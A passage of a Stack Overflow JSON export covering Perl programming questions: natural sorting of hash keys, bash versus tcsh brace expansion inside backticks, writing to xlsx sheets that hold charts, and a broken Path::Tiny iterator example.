"edited": false, "score": 2, "creation_date": 1494932792, "post_id": 43999501, "comment_id": 75027667, "body": "Check out <code>Sort::Naturally</code>."}], "answers": [{"comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "reply_to_user": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1494933544, "post_id": 43999644, "comment_id": 75028196, "body": "@Downvoter: Thats for downvoting without explanation"}], "tags": [], "owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "is_accepted": true, "score": 0, "last_activity_date": 1494932491, "creation_date": 1494932491, "answer_id": 43999644, "question_id": 43999501, "link": "https://stackoverflow.com/questions/43999501/sort-keys-in-hashes-which-contains-alphanumeric-using-perl/43999644#43999644", "title": "Sort keys in hashes which contains alphanumeric using perl", "body": "<p>try this:</p>\n\n<pre><code>%bibIdstr = (\n      'bib16' =&gt; 'newbib12',\n      'bib7' =&gt; 'newbib6',\n      'bib11' =&gt; 'newbib9',\n      'bib4' =&gt; 'newbib4',\n      'bib2' =&gt; 'newbib2',\n      'bib1' =&gt; 'newbib1',\n      'bib18' =&gt; 'newbib13',\n      'bib13' =&gt; 'newbib10',\n      'bib14' =&gt; 'newbib11',\n      'bib10' =&gt; 'newbib8',\n      'bib8' =&gt; 'newbib7',\n      'bib6' =&gt; 'newbib5',\n      'bib3' =&gt; 'newbib3'\n    );\n\nsub sortByNumber($$){\nmy      $a = shift;\nmy      $b = shift;\n        $a =~ s/bib//;\n        $b =~ s/bib//;\n\n        return $a &lt;=&gt; $b;\n}\n\nforeach my $keys (sort {sortByNumber($a,$b) }(keys %bibIdstr))\n{\n    print $keys .\"-&gt;\". $bibIdstr{$keys} . \"\\n\";\n}\n</code></pre>\n\n<p>OUTPUT:</p>\n\n<pre><code>bib1-&gt;newbib1\nbib2-&gt;newbib2\nbib3-&gt;newbib3\nbib4-&gt;newbib4\nbib6-&gt;newbib5\nbib7-&gt;newbib6\nbib8-&gt;newbib7\nbib10-&gt;newbib8\nbib11-&gt;newbib9\nbib13-&gt;newbib10\nbib14-&gt;newbib11\nbib16-&gt;newbib12\nbib18-&gt;newbib13\n</code></pre>\n"}], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "closed_date": 1494932290, "accepted_answer_id": 43999644, "answer_count": 1, "score": -2, "last_activity_date": 1494934022, "creation_date": 1494932114, "last_edit_date": 1494934022, "question_id": 43999501, "link": "https://stackoverflow.com/questions/43999501/sort-keys-in-hashes-which-contains-alphanumeric-using-perl", "closed_reason": "Duplicate", "title": "Sort keys in hashes which contains alphanumeric using perl", "body": "<p>How to sort the Keys from hashes (In keys there is <code>alphaNumeric</code> contains in the hashes) and <strong>print the hashes as an output</strong>.</p>\n\n<pre><code> %bibIdstr = (\n      'bib16' =&gt; 'newbib12',\n      'bib7' =&gt; 'newbib6',\n      'bib11' =&gt; 'newbib9',\n      'bib4' =&gt; 'newbib4',\n      'bib2' =&gt; 'newbib2',\n      'bib1' =&gt; 'newbib1',\n      'bib18' =&gt; 'newbib13',\n      'bib13' =&gt; 'newbib10',\n      'bib14' =&gt; 'newbib11',\n      'bib10' =&gt; 'newbib8',\n      'bib8' =&gt; 'newbib7',\n      'bib6' =&gt; 'newbib5',\n      'bib3' =&gt; 'newbib3'\n    );\n</code></pre>\n\n<p>My Code:</p>\n\n<pre><code>foreach my $keys (sort (keys %bibIdstr))\n{\n    print $keys .\"-&gt;\". $bibIdstr{$keys} . \"\\n\";\n}\n</code></pre>\n\n<p>Its printing output below</p>\n\n<pre><code>bib1-&gt;newbib1\nbib10-&gt;newbib8\nbib11-&gt;newbib9\nbib13-&gt;newbib10\nbib14-&gt;newbib11\nbib16-&gt;newbib12\nbib18-&gt;newbib13\nbib2-&gt;newbib2\nbib3-&gt;newbib3\nbib4-&gt;newbib4\nbib6-&gt;newbib5\nbib7-&gt;newbib6\nbib8-&gt;newbib7\n</code></pre>\n\n<p>But my expected output is:</p>\n\n<pre><code>bib1-&gt;newbib1\nbib2-&gt;newbib2\nbib3-&gt;newbib3\nbib4-&gt;newbib4\nbib6-&gt;newbib5\nbib7-&gt;newbib6\nbib8-&gt;newbib7\nbib10-&gt;newbib8\nbib11-&gt;newbib9\nbib13-&gt;newbib10\nbib14-&gt;newbib11\nbib16-&gt;newbib12\nbib18-&gt;newbib13\n</code></pre>\n\n<p>It would be appreciated if someone could help on this one.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["linux", "bash", "perl", "shell", "tcsh"], "comments": [{"owner": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 1, "creation_date": 1494935223, "post_id": 43998683, "comment_id": 75029380, "body": "<code>bash</code> and <code>tcsh</code> are two <i>completely</i> different shells; which are you actually using?"}, {"owner": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 2, "creation_date": 1494935288, "post_id": 43998683, "comment_id": 75029429, "body": "<code>print</code> isn&#39;t even a valid <code>bash</code> command"}, {"owner": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "reply_to_user": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1494938392, "post_id": 43998683, "comment_id": 75031687, "body": "@chepner this is perl..."}], "answers": [{"comments": [{"owner": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "edited": false, "score": 0, "creation_date": 1494933289, "post_id": 43998900, "comment_id": 75028003, "body": "unfortunately i  wont have access to the system untill next week, but i understand the issue is that doing &#39;ls -d ~/{a}&#39; in the shell actually works. i will mark this as solved for now and update next week. thanks!"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494952819, "post_id": 43998900, "comment_id": 75042420, "body": "Re &quot;<i>doing &#39;ls -d ~/{a}&#39; in the shell actually works</i>&quot;, Did you actually use <code>&#47;bin&#47;sh</code>?"}, {"owner": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "edited": false, "score": 0, "creation_date": 1495366794, "post_id": 43998900, "comment_id": 75213588, "body": "@arrow upon further inspection it seems that under tcsh the ls works, but under bash it does NOT. why though, while using perl under tcsh doesnt it work?"}, {"owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "edited": false, "score": 0, "creation_date": 1495381910, "post_id": 43998900, "comment_id": 75218028, "body": "Perl doesn&#39;t care what shell you are using. Backticks uses /bin/sh."}, {"owner": {"reputation": 5561, "user_id": 8017719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NXoV6.jpg?s=128&g=1", "display_name": "Isaac", "link": "https://stackoverflow.com/users/8017719/isaac"}, "reply_to_user": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "edited": false, "score": 0, "creation_date": 1495457906, "post_id": 43998900, "comment_id": 75246266, "body": "@Nullman Expanded sections for tcsh and perl. All the details should be clear now. Any additional question?."}, {"owner": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "edited": false, "score": 0, "creation_date": 1495476828, "post_id": 43998900, "comment_id": 75258213, "body": "@Arrow excellent and complete answer! the answer to your question is that i dont! im not even using ls. i just gave that as a simple example to a more complex command invocation :)"}], "tags": [], "owner": {"reputation": 5561, "user_id": 8017719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NXoV6.jpg?s=128&g=1", "display_name": "Isaac", "link": "https://stackoverflow.com/users/8017719/isaac"}, "is_accepted": true, "score": 8, "last_activity_date": 1495457633, "last_edit_date": 1495542884, "creation_date": 1494930434, "answer_id": 43998900, "question_id": 43998683, "link": "https://stackoverflow.com/questions/43998683/forcing-brace-expansion-in-backticks-or-why-is-this-inconsistent/43998900#43998900", "title": "forcing brace expansion in backticks or why is this inconsistent?", "body": "<p>Now, after your several edits, I understand that you may be using two different shells. And, also, that the one calling the shell is perl, not you.</p>\n\n<p>So, to cover the three elements:</p>\n\n<h2>bash</h2>\n\n<p>In bash. A simple {a} will not be expanded:</p>\n\n<pre><code>$ echo ~/{a,b}\n/home/user/a /home/user/b\n\n$ echo ~/{a}\n/home/user/{a}\n</code></pre>\n\n<p>Which is searched as a file by <code>ls</code>, and not found.</p>\n\n<p>The relevant part of the manual man bash is (emphasis mine):</p>\n\n<blockquote>\n  <p>A correctly-formed brace expansion must contain unquoted <strong>opening and closing braces</strong>, and at least <strong>one unquoted comma</strong> or a valid sequence expression.</p>\n</blockquote>\n\n<p>A <code>{a}</code> is lacking a required comma.</p>\n\n<p>The only alternative is to actually use </p>\n\n<pre><code>$ print `ls -d ~/a`\n</code></pre>\n\n<h2>tcsh</h2>\n\n<p>In <code>tcsh</code>: A simple {a} will be expanded (as in a <code>csh</code> shell):<br>\nUsing <code>&gt;</code> as shell indicator for tcsh prompt:</p>\n\n<pre><code>&gt; echo --{a,b}++\n --a++ --b++\n\n&gt; echo --{a}++\n--a++\n</code></pre>\n\n<p>As a simple <code>{}</code> also will:</p>\n\n<pre><code>$ echo --{}++\n --++\n</code></pre>\n\n<p>The only braces that will <strong>not</strong> be removed will be <code>{}</code> and <code>{</code> and <code>}</code>.<br>\n<em>IIF</em> (if and only if) they are recognized as \"words\". Most commonly surrounded by spaces:</p>\n\n<pre><code>$ echo --{}++ == {} .. { :: } aa { bb\n--++ == {} .. { :: } aa { bb\n</code></pre>\n\n<p>If a <code>{</code> or a <code>}</code> appear as <em>part</em> of a word, without the matching brace, is an error:</p>\n\n<pre><code>&gt; echo aa{bb\nMissing '}'.\n</code></pre>\n\n<p>The only description of this on the <a href=\"https://linux.die.net/man/1/tcsh\" rel=\"nofollow noreferrer\">man tcsh</a> is really short (unclear?):</p>\n\n<pre><code>&gt; As a special case the words `{', `}' and `{}' are passed undisturbed.\n</code></pre>\n\n<h2>perl</h2>\n\n<p>If the shell commands are <a href=\"https://stackoverflow.com/a/4225709/8017719\">called from perl</a>, in the cases that do call a shell, like under Unix systems, the shell called is <code>/bin/sh</code>.</p>\n\n<p>An an additional twist, the <code>/bin/sh</code> is served by bash in most linux systems, by <a href=\"https://www.freebsd.org/doc/en/articles/linux-users/shells.html\" rel=\"nofollow noreferrer\">tcsh in FreeBSD</a> and by <a href=\"http://daemonforums.org/showpost.php?s=bf0ccfd7a188842b32eb8f1044c43016&amp;p=6544&amp;postcount=3\" rel=\"nofollow noreferrer\">ksh or csh in OpenBSD</a>.</p>\n\n<p>It becomes difficult to predict the output of a perl called <code>/bin/sh</code>.</p>\n\n<p>You could make sure that an specific shell is called:</p>\n\n<pre><code>#!/usr/bin/perl\nprint `/bin/tcsh -c 'ls -d ~/{a,b}'`;\n</code></pre>\n\n<p>Now the question remains: </p>\n\n<ul>\n<li>Why do you need to use brace expansion on a single character?</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "edited": false, "score": 0, "creation_date": 1495379600, "post_id": 44098303, "comment_id": 75217339, "body": "upon further read of <a href=\"http://stackoverflow.com/questions/4225102/which-shell-does-a-perl-system-call-use\" title=\"which shell does a perl system call use\">stackoverflow.com/questions/4225102/&hellip;</a> it seems you are correct! thank you!"}, {"owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "reply_to_user": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "edited": false, "score": 1, "creation_date": 1495380419, "post_id": 44098303, "comment_id": 75217566, "body": "Well, since I cite the actual perl docs, I&#39;m also technically correct, which is the best kind of correct. <a href=\"https://www.youtube.com/watch?v=hou0lU8WMgo\" rel=\"nofollow noreferrer\">youtube.com/watch?v=hou0lU8WMgo</a>"}], "tags": [], "owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "is_accepted": false, "score": 2, "last_activity_date": 1495378725, "creation_date": 1495378725, "answer_id": 44098303, "question_id": 43998683, "link": "https://stackoverflow.com/questions/43998683/forcing-brace-expansion-in-backticks-or-why-is-this-inconsistent/44098303#44098303", "title": "forcing brace expansion in backticks or why is this inconsistent?", "body": "<p>When you are having problems with shell commands, try them outside of Perl (or any program) to see what they do:</p>\n\n<p>Bash:</p>\n\n<pre><code>$ ls ~/{a}\nls: /Users/brian/{a}: No such file or directory\n$ ls ~/{a,b}\nls: /Users/brian/a: No such file or directory\nls: /Users/brian/b: No such file or directory\n</code></pre>\n\n<p>Tsch:</p>\n\n<pre><code>% ls ~/{a}\nls: /Users/brian/a: No such file or directory\n% ls ~/{a,b}\nls: /Users/brian/a: No such file or directory\nls: /Users/brian/b: No such file or directory\n</code></pre>\n\n<p>So, you see that the two shells expand globs differently. From the <a href=\"https://linux.die.net/man/1/bash\" rel=\"nofollow noreferrer\">bash docs</a>:</p>\n\n<blockquote>\n  <p>A correctly-formed brace expansion must contain unquoted opening and closing braces, and at least one unquoted comma or a valid sequence expression. Any incorrectly formed brace expansion is left unchanged. </p>\n</blockquote>\n\n<p>From the <a href=\"https://linux.die.net/man/1/tcsh\" rel=\"nofollow noreferrer\">tcsh docs</a> is a bit lacking in that it doesn't mention that you don't need the comma for expansion: </p>\n\n<blockquote>\n  <p>The metanotation 'a{b,c,d}e' is a shorthand for 'abe ace ade'. Left-to-right order is preserved: '/usr/source/s1/{oldls,ls}.c' expands to '/usr/source/s1/oldls.c /usr/source/s1/ls.c'. The results of matches are sorted separately at a low level to preserve this order: '../{memo,*box}' might expand to '../memo ../box ../mbox'. (Note that 'memo' was not sorted with the results of matching '*box'.) It is not an error when this construct expands to files which do not exist, but it is possible to get an error from a command to which the expanded list is passed. This construct may be nested. As a special case the words '{', '}' and '{}' are passed undisturbed.</p>\n</blockquote>\n\n<p>Now, inside Perl, the backticks use <em>/bin/sh</em>. It doesn't care which shell you were in when you started the <em>perl</em> process. From <a href=\"http://perldoc.perl.org/perlop.html\" rel=\"nofollow noreferrer\">perlop</a>:</p>\n\n<blockquote>\n  <p>A string which is (possibly) interpolated and then executed as a system command with /bin/sh or its equivalent.</p>\n</blockquote>\n\n<p>That's why you see the bash behavior. However, you can use any shell that you like (and is available on the system):</p>\n\n<pre><code>my $output = `tcsh -c 'ls -l ~/{a}'`\n</code></pre>\n"}], "owner": {"reputation": 3058, "user_id": 7540911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6917a4235078edd5bfdc86b37071a108?s=128&d=identicon&r=PG&f=1", "display_name": "Nullman", "link": "https://stackoverflow.com/users/7540911/nullman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 339, "favorite_count": 0, "accepted_answer_id": 43998900, "answer_count": 2, "score": 2, "last_activity_date": 1495458622, "creation_date": 1494929850, "last_edit_date": 1495366735, "question_id": 43998683, "link": "https://stackoverflow.com/questions/43998683/forcing-brace-expansion-in-backticks-or-why-is-this-inconsistent", "title": "forcing brace expansion in backticks or why is this inconsistent?", "body": "<p>When using backticks (in perl) i seem to have some sort of inconsistency with brace expansion</p>\n\n<pre><code>print `ls -d ~/{a,b}`;\n</code></pre>\n\n<p>Works fine, but when i try  </p>\n\n<pre><code>print `ls -d ~/{a}`;\n</code></pre>\n\n<p>I get:  </p>\n\n<blockquote>\n<pre><code>ls: cannot access /home/user/{a}: No such file or directory\n</code></pre>\n</blockquote>\n\n<p>I have tried all sort of quoting, spacing  and escapes but to no avail. my question is, is there a way to force the expansion? I realize I can avoid the issue all together if I just glob the stuff myself, but I'm curious about this behavior </p>\n\n<p>i tried this under both bash and tcsh. when used directly under tcsh, the command works, but under bash it doesn't</p>\n"}, {"tags": ["python-2.7", "perl"], "comments": [{"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494963529, "post_id": 43997547, "comment_id": 75048508, "body": "have you tried Spreadsheet::XLSX?"}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 8018676, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58bb4326eb18b4a08f8cfe28f5716612?s=128&d=identicon&r=PG&f=1", "display_name": "Hiten Chedda", "link": "https://stackoverflow.com/users/8018676/hiten-chedda"}, "edited": false, "score": 0, "creation_date": 1495610742, "post_id": 44012972, "comment_id": 75320186, "body": "Thanks for the response but still the graphs, fonts  and formats are not visible in the new excel sheet..."}, {"owner": {"reputation": 184, "user_id": 6115421, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/15a623fe6b5c826ee955a1474fc1723e?s=128&d=identicon&r=PG&f=1", "display_name": "Dragos Trif", "link": "https://stackoverflow.com/users/6115421/dragos-trif"}, "reply_to_user": {"reputation": 21, "user_id": 8018676, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58bb4326eb18b4a08f8cfe28f5716612?s=128&d=identicon&r=PG&f=1", "display_name": "Hiten Chedda", "link": "https://stackoverflow.com/users/8018676/hiten-chedda"}, "edited": false, "score": 0, "creation_date": 1495885822, "post_id": 44012972, "comment_id": 75443773, "body": "Hi @Hiten Chedda i&#39;ve inserted some small to create charts."}], "tags": [], "owner": {"reputation": 184, "user_id": 6115421, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/15a623fe6b5c826ee955a1474fc1723e?s=128&d=identicon&r=PG&f=1", "display_name": "Dragos Trif", "link": "https://stackoverflow.com/users/6115421/dragos-trif"}, "is_accepted": false, "score": 1, "last_activity_date": 1495885673, "last_edit_date": 1495885673, "creation_date": 1494975786, "answer_id": 44012972, "question_id": 43997547, "link": "https://stackoverflow.com/questions/43997547/modify-existing-xlsx-sheet-containing-graphs-and-charts/44012972#44012972", "title": "Modify existing xlsx sheet containing graphs and charts", "body": "<p>This code will keep the old and let you add some new code:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Excel::Writer::XLSX;\nuse Spreadsheet::Read;\nuse Data::Dumper;\n\n# read the file\nmy $book = ReadData ('Factura.xls');\nmy @data;\nmy @sheets = (0..1);\nmy $workbook  = Excel::Writer::XLSX-&gt;new( 'Factura_1.xls' );\nmy $worksheet;\n# save the old data \nforeach my $sheet (1 .. ($#sheets+1)) {\n   my @rows = Spreadsheet::Read::rows($book-&gt;[$sheet]);\n   $worksheet = $workbook-&gt;add_worksheet($sheet);\n  foreach my $i (1 .. scalar @rows) {\n    foreach my $j (1 .. scalar @{$rows[$i-1]}) {\n       $worksheet-&gt;write($i-1, $j-1, $rows[$i-1][$j-1] );\n       my $chart = $workbook-&gt;add_chart( type =&gt; 'bar',  embedded =&gt; 1); \n     $chart-&gt;add_series(\n      name   =&gt; '='.\"1\".'!$A$0',\n      values =&gt; '='.\"1\".'!$A$2:$A$15',\n   );\n   $worksheet-&gt;insert_chart( 'E2', $chart, 25, 10 );\n    }\n  }\n\n}\n\n# write new data \n$worksheet = $workbook-&gt;add_worksheet(3);\n$worksheet-&gt;write( 0, 0, 'New string' );\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 8018676, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58bb4326eb18b4a08f8cfe28f5716612?s=128&d=identicon&r=PG&f=1", "display_name": "Hiten Chedda", "link": "https://stackoverflow.com/users/8018676/hiten-chedda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 536, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1496034362, "creation_date": 1494926948, "question_id": 43997547, "link": "https://stackoverflow.com/questions/43997547/modify-existing-xlsx-sheet-containing-graphs-and-charts", "title": "Modify existing xlsx sheet containing graphs and charts", "body": "<p>I already have xlsx which consists of 9 sheets, out of which 1-7 sheet consists of graph while 8 and 9 sheets are blank. What I need to do is write some data in 8th and 9th sheet. Well I tried this using python but after wring the data in the xlsx sheet the graph and charts disappears. </p>\n\n<p>Below code I have tried below perl code to modify the existing xls sheet<br/>\n<i>Note: Here I have converted the xlsx into xls and reused it.</i></p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Spreadsheet::ParseExcel;\nuse Spreadsheet::ParseExcel::SaveParser;\n\n\nmy $parser   = Spreadsheet::ParseExcel::SaveParser-&gt;new();\nmy $template = $parser-&gt;Parse('TEMP.XLS');\n\nmy $worksheet = $template-&gt;worksheet('8');\nmy $row  = 0;\nmy $col  = 0;\n\n$worksheet-&gt;AddCell( $row, $col, 'New string' );\n$worksheet-&gt;AddCell( $row, $col + 1, 'Newer' );\n\n$template-&gt;SaveAs('newfile.xls');\n</code></pre>\n\n<p>But it resulted as removal of graphs and charts.\nCan any one help me to do the same in perl or python.</p>\n\n<p>Thanks in advance..</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": true, "score": 3, "last_activity_date": 1494923082, "last_edit_date": 1494923082, "creation_date": 1494921813, "answer_id": 43995707, "question_id": 43995616, "link": "https://stackoverflow.com/questions/43995616/error-running-learn-perl-learn-perl-org-example-for-reading-a-directory/43995707#43995707", "title": "Error running Learn Perl (learn.perl.org) example for reading a directory", "body": "<p>Looks like a simple mistake on the learn.perl.org example: the example in the <a href=\"https://metacpan.org/pod/Path::Tiny#iterator\" rel=\"nofollow noreferrer\">Path::Tiny docs</a> is correct. The iterator is a function, not an object; it produces values using <code>$iter-&gt;()</code>, not<br>\n<code>$iter-&gt;next</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 4, "last_activity_date": 1494922143, "creation_date": 1494922143, "answer_id": 43995815, "question_id": 43995616, "link": "https://stackoverflow.com/questions/43995616/error-running-learn-perl-learn-perl-org-example-for-reading-a-directory/43995815#43995815", "title": "Error running Learn Perl (learn.perl.org) example for reading a directory", "body": "<p>Yes, you're right. It seems that this example was changed to use Path::Tiny in the last few days and this error slipped in at that point.</p>\n\n<p>I've submitted a pull request to fix it.</p>\n\n<p><a href=\"https://github.com/perlorg/perlweb/pull/233\" rel=\"nofollow noreferrer\">https://github.com/perlorg/perlweb/pull/233</a></p>\n"}], "owner": {"reputation": 5858, "user_id": 1530549, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9acb42e69fdeeaf6474022411fe61725?s=128&d=identicon&r=PG", "display_name": "Scooter", "link": "https://stackoverflow.com/users/1530549/scooter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 43995707, "answer_count": 2, "score": 2, "last_activity_date": 1494923082, "creation_date": 1494921541, "question_id": 43995616, "link": "https://stackoverflow.com/questions/43995616/error-running-learn-perl-learn-perl-org-example-for-reading-a-directory", "title": "Error running Learn Perl (learn.perl.org) example for reading a directory", "body": "<p>learn.perl.org has example code for <a href=\"http://learn.perl.org/examples/directory_list.html\" rel=\"nofollow noreferrer\">reading the contents of a directory</a>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nuse Path::Tiny;\n\nmy $dir = path('foo','bar'); # foo/bar\n\n# Iterate over the content of foo/bar\nmy $iter = $dir-&gt;iterator;\nwhile (my $file = $iter-&gt;next) {\n\n    # See if it is a directory and skip\n    next if $file-&gt;is_dir();\n\n    # Print out the file name and path\n    print \"$file\\n\";\n}\n</code></pre>\n\n<p>Running it with Perl 5.18.2 and Path::Tiny of DAGOLDEN/Path-Tiny-0.104.tar.gz, I get an error:</p>\n\n<blockquote>\n  <p>Can't call method \"next\" on unblessed reference at read_directory.pl\n  line 11.</p>\n</blockquote>\n"}, {"tags": ["perl", "variables"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494921391, "post_id": 43995522, "comment_id": 75019614, "body": "It is the text which is match the regex in the if statement"}, {"owner": {"reputation": 3130, "user_id": 2064808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d819efdb2d3f9983a1437f3c1b9f710?s=128&d=identicon&r=PG", "display_name": "David Knipe", "link": "https://stackoverflow.com/users/2064808/david-knipe"}, "edited": false, "score": 0, "creation_date": 1535233018, "post_id": 43995522, "comment_id": 90993232, "body": "That&#39;s the second <code>if</code> (the inner one). If it fails to match then I guess <code>$_</code> will be <code>undef</code>."}], "answers": [{"tags": [], "owner": {"reputation": 140, "user_id": 1922726, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4e66da85e8a560d7350989300a4fc4fc?s=128&d=identicon&r=PG", "display_name": "JeremiahBarrar", "link": "https://stackoverflow.com/users/1922726/jeremiahbarrar"}, "is_accepted": true, "score": 0, "last_activity_date": 1494989155, "last_edit_date": 1494989155, "creation_date": 1494922160, "answer_id": 43995822, "question_id": 43995522, "link": "https://stackoverflow.com/questions/43995522/what-will-be-the-value-of-this-variable/43995822#43995822", "title": "What will be the value of this variable?", "body": "<pre><code> foreach ($c = 0;$c &lt;= @htmllines;$c++) {\n    if ($htmllines[$c] !~ /(&lt;!--responses: $delkursnr--&gt;0)/) {\n        if ($htmllines[$c] =~ /&lt;!--responses: $delkursnr--&gt;(.*)/){\n            $rspbegin = $c;\n        };\n        $teilnehmer= $_;\n    }\n}\n</code></pre>\n\n<p>This means 